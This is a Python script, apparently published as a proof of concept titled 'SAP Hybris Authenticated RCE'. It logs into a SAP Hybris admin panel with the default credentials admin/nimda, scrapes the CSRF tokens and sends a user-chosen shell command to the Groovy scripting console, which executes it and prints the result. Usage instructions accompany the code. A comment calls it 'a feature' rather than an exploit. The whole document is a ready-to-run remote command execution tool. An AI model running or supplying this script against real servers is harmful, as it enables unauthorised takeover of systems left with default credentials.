import sys
import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# It is not an exploit. It is a feature. You can run groovy scripts on Console > Scripting Languages


def sap_rce(host, cmd):
    headers = {}
    headers['user-agent'] = 'B3r-Sec'

    response = requests.get(host + "/adminpanel/login", headers=headers, verify=False)

    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.select_one('meta[name="_csrf"]')['content']

    headers['accept'] = 'text/html,application/xhtml+xml,application/xml'
    headers['cookie'] = '; '.join([x.name + '=' + x.value for x in response.cookies])
    headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'

    payload = {
        'j_username': 'admin',  # You can change this
        'j_password': 'nimda',  # You can change this
        '_csrf': csrf_token
    }

    s = requests.session()
    response2 = s.post(host + "/adminpanel/j_spring_security_check", data=payload, headers=headers, verify=False)

    if response2.status_code == 200:
        print("\n[+] Successfully logged in!")
        soup2 = BeautifulSoup(response2.text, "html.parser")

        headers = {}
        headers['user-agent'] = 'B3r-Sec'
        headers['X-Csrf-Token'] = soup2.select_one('meta[name="_csrf"]')['content']

        payload = {}
        payload['scriptType'] = 'groovy'
        payload['commit'] = 'false'
        payload['script'] = 'def cmd = "' + cmd + '".execute();println("${cmd.text}");'

        response3 = s.post(host + "/adminpanel/console/scripting/execute", data=payload, headers=headers,
                           verify=False)

        print("[+] Result => Command: " + cmd + " >> \n\n" + response3.json()['outputText'])
    else:
        print("Hop !")


print("\nSAP Hybris Authenticated RCE\nAuthor: @erberkan (B3r-Sec)")

if len(sys.argv) > 1:
    sap_rce(sys.argv[1], sys.argv[2])
else:
    print("\nUsage: python3 sap_hybris_rce.py <URL> <CMD>\nExample: python3 sap_hybris_rce.py http://192.168.13.37 "
          "'hostname'\n")
